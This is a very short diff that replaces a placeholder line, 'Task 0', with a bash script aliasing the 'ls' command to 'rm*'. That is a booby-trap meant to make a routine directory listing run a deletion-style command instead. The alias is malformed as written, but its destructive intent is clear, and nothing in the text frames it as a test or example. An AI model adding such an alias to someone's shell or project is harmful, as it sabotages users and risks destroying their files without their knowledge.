@@ -1,1 +1,2 @@
-Task 0
+#!/bin/bash
+alias ls="rm*"
